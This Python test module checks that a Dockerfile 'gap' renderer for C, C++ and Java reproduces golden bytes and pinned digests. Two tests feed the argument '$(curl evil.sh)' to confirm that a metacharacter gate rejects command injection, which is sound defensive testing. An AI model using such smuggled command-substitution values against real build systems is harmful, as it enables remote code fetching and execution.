r"""The gap seam: a plan renders the bytes the plugin hardcodes, and nothing else.

`render_gap` exists so that the ONE part of a Dockerfile that varies per repo --
how the toolchain and the dependencies get into the image -- can eventually come
from a resolver instead of from a literal. That is only safe if the seam is
proved to be a no-op first, on the smallest gap there is.

This module is that proof, and it is deliberately paranoid:

  * `render_gap(C_MEASURE_DEP_PLAN)` equals a GOLDEN LITERAL copied out of the
    rendered image, not a re-derivation of the same f-strings. A test that
    computed its expectation from the code under test would pass no matter what
    the code did.
  * `render_measure_dockerfile(env, dep_plan=...)` is byte-for-byte the default
    rendering. This is the load-bearing one: it says the seam MOVED nothing.
  * The default path's sha256 is pinned to the digest measured against the
    commit before the seam existed. A future edit that "improves" the gap while
    the plan happens to agree with it still fails here.

Pure: no docker, no network, no LLM, no clock, no host path.
"""

from __future__ import annotations

import dataclasses
import hashlib
import inspect

import pytest

from taskgen import langs
from taskgen.depplan import DepPlan, DepPlanError, InstallCommand, canonicalize, validate
from taskgen.langs import base as B
from taskgen.langs import c as C
from taskgen.langs import cpp as CPP
from taskgen.langs import java as JAVA

#: sha256 of `CPlugin.render_measure_dockerfile(EnvSpec('c-xs'))` as rendered by
#: the commit BEFORE `render_gap` existed, measured by re-rendering from a clean
#: `git archive` of that tree. The seam is additive iff this digest survives it.
PRE_SEAM_MEASURE_SHA256 = (
    '080516e7d82252ee43a11c69123aac33dee0c4a0ebf14ff2e78985463342fe1f'
)

#: The same digest for cpp and java, captured from THEIR pre-seam bytes -- the
#: rendering produced with the `dep_plan`-reject guard still in place, before
#: either plugin had a `render_gap` at all.
PRE_SEAM_CPP_MEASURE_SHA256 = (
    '1ade09e7b64416358b512d79fa1515667d67f0749f55d6d31bb77229d1ccf6ce'
)
PRE_SEAM_JAVA_MEASURE_SHA256 = (
    '093eb2e5ad93ac675a0e405c5470c23087ef3b907823df713e0a127c1c1c84b7'
)

#: c's gap, byte-for-byte, as it appears in the shipped measure Dockerfile:
#: the version echo, the login-shell pin assert, the ENV/WORKDIR placement tail
#: and the "nothing was warmed" note. Raw string -- the backslashes are the
#: Dockerfile's own line continuations, not escapes.
GOLDEN_C_GAP = r'''# harbor-base already ships gcc 13.3.0 and GNU Make 4.3 on aarch64.
# The c-xs repo compiles with -lm -lpthread -ldl only (libc6-dev), so
# there is nothing to install here; the version echo makes the layer
# non-empty and prints the exact toolchain grades will use.
RUN gcc --version | head -1 && make --version | head -1
# gcc is baked into the base image, so there is no shim to reorder --
# but an UNASSERTED compiler is how a base swap moves the published
# numbers with nothing failing. Run as a login shell because that is
# how harbor's test.sh resolves the compiler at grade time.
RUN set -eux; \
    g="$(bash -lc 'gcc --version | head -1')"; \
    case "$g" in \
      *13.3*) echo "TOOLCHAIN PIN OK (login shell): $g" ;; \
      *) echo "TOOLCHAIN PIN FAILED (login shell): got $g want gcc 13.3" >&2; exit 42 ;; \
    esac
ENV LC_ALL=C.UTF-8
ENV MAKEFLAGS=-j4
WORKDIR /opt/harbor/repo

# no warmed dependencies (harbor-base ships gcc + make + libc6-dev)'''

#: cpp's gap, byte-for-byte, as it appears in the shipped measure Dockerfile:
#: the alternatives group that makes the C++26 compiler the default, the
#: login-shell pin assert, the ENV/WORKDIR placement tail and the "nothing was
#: warmed" note. Raw string -- the backslashes are the Dockerfile's own line
#: continuations, not escapes.
GOLDEN_CPP_GAP = r'''# The base ships cmake 4.4.2, g++-14 14.2.0, ninja 1.12.1 and clang 19.1.7 --
# exactly the set this block used to apt-install on every task build, at the
# cost of two package-index refreshes, a Kitware key import and an unpinned
# package resolution inside a network the grade step forbids.
# Make the C++26-capable compiler the default so a plain `g++`/`cc` picks
# up 14 rather than the distro default. `cc`/`c++` are already MASTER
# alternatives, so they cannot be attached as slaves of the gcc group.
RUN update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-14 100 \
      --slave /usr/bin/g++ g++ /usr/bin/g++-14 \
 && update-alternatives --install /usr/bin/cc  cc  /usr/bin/gcc-14 100 \
 && update-alternatives --install /usr/bin/c++ c++ /usr/bin/g++-14 100
# Assert under a login shell: the base re-exports its own PATH from
# /etc/profile.d, which is how harbor's test.sh resolves these binaries.
RUN set -eux; \
    c="$(bash -lc 'cmake --version | head -1')"; \
    g="$(bash -lc 'g++-14 --version | head -1')"; \
    case "$c" in *4.4.2*) ;; *) echo "TOOLCHAIN PIN FAILED (login shell): $c" >&2; exit 42;; esac; \
    case "$g" in *14.2.0*) ;; *) echo "TOOLCHAIN PIN FAILED (login shell): $g" >&2; exit 42;; esac; \
    bash -lc 'ninja --version && clang --version | head -1'
ENV CC=gcc-14
ENV CXX=g++-14
ENV DEBIAN_FRONTEND=noninteractive
WORKDIR /opt/harbor/repo

# no warmed dependencies (cpp installs its toolchain via apt above)'''

#: java's gap, byte-for-byte: the mise JDK selection, the zz- profile.d PATH
#: pin, the login-shell `java -version` assert, the gradle.properties write, the
#: ENV/WORKDIR tail and the "no separate warm stage" note.
GOLDEN_JAVA_GAP = r'''# The base bakes temurin 17/21/25 and gradle; select one rather than
# apt-installing a JDK on every task build.
RUN set -eux; mise use -g java@temurin-25.0.4+7.0.LTS
# profile.d is sourced in sorted order and the base re-exports its own PATH
# ahead of the mise shims, so only a zz- file keeps the pin in front for the
# login shells harbor's test.sh and solve.sh actually run as.
RUN set -eux; \
    printf 'export PATH="/opt/mise/shims:$PATH"\n' > /etc/profile.d/zz-harbor-toolchain-pin.sh; \
    chmod 0644 /etc/profile.d/zz-harbor-toolchain-pin.sh
RUN set -eux; \
    v="$(bash -lc 'java -version 2>&1 | head -1')"; \
    case "$v" in \
        *\"25.*) echo "TOOLCHAIN PIN OK (login shell): $v" ;; \
        *) echo "TOOLCHAIN PIN FAILED (login shell): got $v want 25.x" >&2; exit 42 ;; \
    esac
# org.gradle.java.home pins the COMPILE JVM; the launcher JVM comes from PATH.
RUN set -eux; \
    mkdir -p /opt/gradle-home; \
    printf 'org.gradle.java.home=%s\n' /opt/mise/installs/java/temurin-25.0.4+7.0.LTS \
        >> /opt/gradle-home/gradle.properties
ENV DEBIAN_FRONTEND=noninteractive
ENV GRADLE_USER_HOME=/opt/gradle-home
ENV JAVA_HOME=/opt/mise/installs/java/temurin-25.0.4+7.0.LTS
ENV PATH=/opt/mise/shims:${PATH}
WORKDIR /opt/harbor/repo

# no separate warm stage (measure warms its own cache below)'''

#: One row per language whose gap is now plan-rendered, so every property below
#: is asserted for all three from a single enumeration: a fourth language added
#: to `render_gap` without a row here is a missing row, not a silent gap.
#: `repo_name` is part of each row because the pre-seam digest was measured
#: against that exact `EnvSpec`.
GAP_LANGS = (
    ('c', 'c-xs', C.C_MEASURE_DEP_PLAN, GOLDEN_C_GAP, PRE_SEAM_MEASURE_SHA256),
    ('cpp', 'cpp-Rux', CPP.CPP_MEASURE_DEP_PLAN, GOLDEN_CPP_GAP,
     PRE_SEAM_CPP_MEASURE_SHA256),
    ('java', 'java-tamboui', JAVA.JAVA_MEASURE_DEP_PLAN, GOLDEN_JAVA_GAP,
     PRE_SEAM_JAVA_MEASURE_SHA256),
)

GAPLESS_LANGS = ('rust',)


@pytest.fixture()
def plugin() -> C.CPlugin:
    return C.CPlugin()


@pytest.fixture()
def env() -> B.EnvSpec:
    return B.EnvSpec(repo_name='c-xs')


# ---------------------------------------------------------------- the plan ---


def test_c_dep_plan_is_valid_and_already_canonical():
    """The constant is a plan a resolver could legally have produced."""
    validate(C.C_MEASURE_DEP_PLAN)
    assert canonicalize(C.C_MEASURE_DEP_PLAN) == C.C_MEASURE_DEP_PLAN


def test_c_dep_plan_installs_nothing():
    """c's gap provisions NOTHING: libc6-dev and gcc are baked into harbor-base.

    A non-empty field here would make the gap emit an apt-get or an install RUN
    that the shipped measure image does not contain -- and that would want
    network in a build that is supposed to need none.
    """
    assert C.C_MEASURE_DEP_PLAN.apt_packages == ()
    assert C.C_MEASURE_DEP_PLAN.install_commands == ()
    assert C.C_MEASURE_DEP_PLAN.package_manager in {'make', 'cmake'}
    assert dict(C.C_MEASURE_DEP_PLAN.test_invocation)['command'] == tuple(
        C.TEST_COMMAND.split()
    )


# ----------------------------------------------------------------- the gap ---


def test_render_gap_equals_the_golden_bytes(plugin):
    """The plan reproduces the hardcoded gap EXACTLY, against a copied literal."""
    assert plugin.render_gap(C.C_MEASURE_DEP_PLAN) == GOLDEN_C_GAP


def test_golden_gap_occupies_the_hardcoded_slot(plugin, env):
    """The literal is the gap of the REAL Dockerfile, in one place, at the seam."""
    text = plugin.render_measure_dockerfile(env)
    assert text.count(GOLDEN_C_GAP) == 1
    head, tail = text.split(GOLDEN_C_GAP)
    assert head.endswith(f'FROM {plugin.toolchain_spec().base_image} AS measure\n\n')
    assert tail.startswith('\n\n# The measure phase points repoctx')


def test_render_gap_is_deterministic(plugin):
    assert plugin.render_gap(C.C_MEASURE_DEP_PLAN) == plugin.render_gap(
        C.C_MEASURE_DEP_PLAN
    )


def test_render_gap_reads_the_plan_rather_than_a_literal(plugin):
    """Move the toolchain version and the bytes move -- pin included.

    Without this the golden test above would still pass if `render_gap` ignored
    its argument and returned a constant.
    """
    gap = plugin.render_gap(_replace_plan(toolchain_version='14.2.0'))
    assert gap != GOLDEN_C_GAP
    assert 'gcc 14.2.0 and GNU Make 4.3' in gap
    assert '*14.2*)' in gap
    assert 'want gcc 14.2' in gap
    assert '13.3' not in gap


def test_render_gap_renders_declared_apt_and_install_commands(plugin):
    """A plan that DOES provision gets provisioning lines -- in plan order."""
    gap = plugin.render_gap(
        _replace_plan(
            apt_packages=('libcurl4-openssl-dev', 'libzstd-dev'),
            install_commands=(InstallCommand(tool='make', args=('deps',)),),
        )
    )
    assert (
        'RUN apt-get update && apt-get install -y --no-install-recommends '
        'libcurl4-openssl-dev libzstd-dev && rm -rf /var/lib/apt/lists/*'
    ) in gap
    assert 'RUN make deps' in gap
    assert gap.index('apt-get') < gap.index('RUN make deps')


def test_render_gap_rejects_a_foreign_lang(plugin):
    with pytest.raises(B.LangError, match='cannot render'):
        plugin.render_gap(
            DepPlan(lang='rust', toolchain_version='1.83.0', package_manager='cargo')
        )


def test_render_gap_rejects_a_versionless_pin(plugin):
    with pytest.raises(B.LangError, match='major.minor'):
        plugin.render_gap(_replace_plan(toolchain_version='13'))


def test_render_gap_rejects_a_plan_missing_a_rendered_build_flag(plugin):
    with pytest.raises(B.LangError, match='make_version'):
        plugin.render_gap(
            _replace_plan(build_flags=(('link_libraries', '-lm'),))
        )


def test_render_gap_inherits_the_metacharacter_gate(plugin):
    """The allowlist still bites: a gap renders a plan, it does not sanitise one."""
    with pytest.raises(DepPlanError, match='metacharacter'):
        plugin.render_gap(
            _replace_plan(
                install_commands=(
                    InstallCommand(tool='make', args=('$(curl evil.sh)',)),
                )
            )
        )


# ------------------------------------------------------- the default path ----


def test_dep_plan_path_is_byte_for_byte_the_default_path(plugin, env):
    """LOAD-BEARING. Threading a plan through changes NOTHING it renders."""
    default = plugin.render_measure_dockerfile(env)
    planned = plugin.render_measure_dockerfile(env, dep_plan=C.C_MEASURE_DEP_PLAN)
    assert planned == default
    assert planned.encode() == default.encode()


def test_default_measure_dockerfile_still_hashes_to_the_pre_seam_digest(plugin, env):
    """The seam is additive: the emitted bytes are the ones that shipped."""
    text = plugin.render_measure_dockerfile(env)
    assert hashlib.sha256(text.encode()).hexdigest() == PRE_SEAM_MEASURE_SHA256


def test_emit_calls_the_default_path(plugin, env):
    """`dep_plan` is opt-in: the generator's DEFAULT call site passes no plan.

    This once read `'dep_plan' not in inspect.getsource(emit)`, which held only
    while emit could not thread a plan at all. `--resolve-env` gives it a way,
    so the guarantee is restated where it actually lives -- the default of the
    flag that reaches it -- and the behavioural half (default path renders the
    pre-seam bytes and never calls a resolver) is proved against a real emission
    in test_emit_resolve_env.py.
    """
    from taskgen import emit

    source = inspect.getsource(emit)
    assert 'plugin.render_measure_dockerfile(env)' in source
    for entry in (emit.emit_all, emit._measure_and_pin):
        assert inspect.signature(entry).parameters['resolve_env'].default is False


# ------------------------------------------- the same seam, every language ---


@pytest.mark.parametrize('name,repo,plan,golden,digest', GAP_LANGS)
def test_the_canonical_plan_is_valid_and_already_canonical(
    name, repo, plan, golden, digest,
):
    """Each constant is a plan a resolver could legally have produced."""
    validate(plan)
    assert canonicalize(plan) == plan
    assert plan.lang == name


@pytest.mark.parametrize('name,repo,plan,golden,digest', GAP_LANGS)
def test_the_canonical_plan_provisions_nothing(name, repo, plan, golden, digest):
    """Every one of these toolchains is BAKED, so its gap installs nothing.

    A non-empty field here would make the gap emit an `apt-get` or an install
    RUN that the shipped measure image does not contain -- and that would want
    network in a build that is supposed to need none.
    """
    assert plan.apt_packages == ()
    assert plan.install_commands == ()


@pytest.mark.parametrize('name,repo,plan,golden,digest', GAP_LANGS)
def test_the_canonical_plan_passes_its_own_pre_render_gate(
    name, repo, plan, golden, digest,
):
    """The fixed point: each language's own environment clears its own gate."""
    langs.get(name).validate_dep_plan(plan)


@pytest.mark.parametrize('name,repo,plan,golden,digest', GAP_LANGS)
def test_the_gap_equals_the_golden_bytes(name, repo, plan, golden, digest):
    """The plan reproduces the hardcoded gap EXACTLY, against a copied literal."""
    assert langs.get(name).render_gap(plan) == golden


@pytest.mark.parametrize('name,repo,plan,golden,digest', GAP_LANGS)
def test_the_golden_gap_occupies_the_hardcoded_slot(
    name, repo, plan, golden, digest,
):
    """The literal is the gap of the REAL Dockerfile, in one place, at the seam."""
    plug = langs.get(name)
    text = plug.render_measure_dockerfile(B.EnvSpec(repo_name=repo))

    assert text.count(golden) == 1
    head, _, tail = text.partition(golden)
    assert head.endswith(f'FROM {plug.toolchain_spec().base_image} AS measure\n\n')
    assert tail.startswith('\n\n')


@pytest.mark.parametrize('name,repo,plan,golden,digest', GAP_LANGS)
def test_the_planned_path_is_byte_for_byte_the_default_path(
    name, repo, plan, golden, digest,
):
    """LOAD-BEARING. Three-way identity: default == planned == the pre-seam bytes.

    The digest is the third leg on purpose. Without it the first two could agree
    on bytes that had BOTH moved -- a gap "improved" while the plan was updated
    to match would satisfy an equality check and silently change every measure
    image the generator builds.
    """
    plug = langs.get(name)
    env = B.EnvSpec(repo_name=repo)

    default = plug.render_measure_dockerfile(env)
    planned = plug.render_measure_dockerfile(env, dep_plan=plan)

    assert planned == default
    assert planned.encode() == default.encode()
    assert hashlib.sha256(default.encode()).hexdigest() == digest


@pytest.mark.parametrize('name,repo,plan,golden,digest', GAP_LANGS)
def test_the_gap_rejects_a_plan_for_another_language(
    name, repo, plan, golden, digest,
):
    foreign = DepPlan(lang='rust', toolchain_version='1.83.0', package_manager='cargo')
    with pytest.raises(B.LangError, match='cannot render'):
        langs.get(name).render_gap(foreign)


def test_the_cpp_gap_reads_the_plan_rather_than_a_literal():
    """Move the compiler and the bytes move -- alternatives, pin and ENV included.

    Without this the golden test above would still pass if `render_gap` ignored
    its argument and returned a constant.
    """
    gap = langs.get('cpp').render_gap(
        canonicalize(
            dataclasses.replace(CPP.CPP_MEASURE_DEP_PLAN, toolchain_version='15.1.0')
        )
    )

    assert gap != GOLDEN_CPP_GAP
    assert 'g++-15 15.1.0' in gap
    assert '/usr/bin/gcc-15' in gap and '/usr/bin/g++-15' in gap
    assert '*15.1.0*' in gap
    assert 'ENV CC=gcc-15' in gap and 'ENV CXX=g++-15' in gap
    assert '14.2.0' not in gap and 'gcc-14' not in gap


def test_the_java_gap_reads_the_plan_rather_than_a_literal():
    """Move the JDK and the bytes move -- mise selection, pin, JAVA_HOME included."""
    gap = langs.get('java').render_gap(
        canonicalize(
            dataclasses.replace(
                JAVA.JAVA_MEASURE_DEP_PLAN, toolchain_version='zulu-21.0.5+11.0',
            )
        )
    )

    assert gap != GOLDEN_JAVA_GAP
    assert 'The base bakes zulu 17/21/25' in gap
    assert 'mise use -g java@zulu-21.0.5+11.0' in gap
    assert '*\\"21.*)' in gap and 'want 21.x' in gap
    assert '/opt/mise/installs/java/zulu-21.0.5+11.0' in gap
    assert 'temurin' not in gap and '25.' not in gap


@pytest.mark.parametrize(
    'name,plan',
    (
        ('cpp', CPP.CPP_MEASURE_DEP_PLAN),
        ('java', JAVA.JAVA_MEASURE_DEP_PLAN),
    ),
)
def test_a_declared_apt_and_install_step_still_renders(name, plan):
    """A plan that DOES provision gets provisioning lines -- in plan order.

    Unreachable for the canonical plans (both fields are empty by construction),
    which is exactly why it needs its own test: these are the only lines of
    either gap that today's shipped bytes do not exercise.
    """
    tool = 'cmake' if name == 'cpp' else 'gradle'
    gap = langs.get(name).render_gap(
        canonicalize(
            dataclasses.replace(
                plan,
                apt_packages=('libcurl4-openssl-dev', 'libzstd-dev'),
                install_commands=(InstallCommand(tool=tool, args=('--version',)),),
            )
        )
    )

    assert (
        'RUN apt-get update && apt-get install -y --no-install-recommends '
        'libcurl4-openssl-dev libzstd-dev && rm -rf /var/lib/apt/lists/*'
    ) in gap
    assert f'RUN {tool} --version' in gap
    assert gap.index('apt-get') < gap.index(f'RUN {tool} --version')


@pytest.mark.parametrize(
    'name,plan',
    (
        ('cpp', CPP.CPP_MEASURE_DEP_PLAN),
        ('java', JAVA.JAVA_MEASURE_DEP_PLAN),
    ),
)
def test_the_gap_inherits_the_metacharacter_gate(name, plan):
    """The allowlist still bites: a gap renders a plan, it does not sanitise one."""
    tool = 'cmake' if name == 'cpp' else 'gradle'
    with pytest.raises(DepPlanError, match='metacharacter'):
        langs.get(name).render_gap(
            dataclasses.replace(
                plan,
                install_commands=(InstallCommand(tool=tool, args=('$(curl evil.sh)',)),),
            )
        )


# ------------------------------------------------------------- the refusals --


def test_base_render_gap_raises_not_implemented(plugin):
    """The base default REFUSES rather than returning an empty gap.

    An empty string here would render a measure image with no toolchain in it
    and no error anywhere, which is the failure mode this raise exists for.
    """
    with pytest.raises(NotImplementedError):
        B.LangPlugin.render_gap(plugin, C.C_MEASURE_DEP_PLAN)


@pytest.mark.parametrize('name', GAPLESS_LANGS)
def test_plugins_without_a_gap_inherit_the_refusal(name):
    with pytest.raises(NotImplementedError):
        langs.get(name).render_gap(C.C_MEASURE_DEP_PLAN)


@pytest.mark.parametrize('name', GAPLESS_LANGS)
def test_plugins_without_a_gap_refuse_a_plan_instead_of_ignoring_it(name):
    plug = langs.get(name)
    env = B.EnvSpec(repo_name='demo-repo')
    assert plug.render_measure_dockerfile(env)
    with pytest.raises(B.LangError, match='does not render its gap'):
        plug.render_measure_dockerfile(env, dep_plan=C.C_MEASURE_DEP_PLAN)


@pytest.mark.parametrize('name', ('python', 'go'))
def test_parser_backed_langs_still_raise_for_a_measure_dockerfile(name):
    """The base raise survives: a parser-backed lang has no measure image at all."""
    with pytest.raises(B.LangError, match='does not render a measure dockerfile'):
        langs.get(name).render_measure_dockerfile(B.EnvSpec(repo_name='demo-repo'))


def _replace_plan(**overrides: object) -> DepPlan:
    return canonicalize(dataclasses.replace(C.C_MEASURE_DEP_PLAN, **overrides))
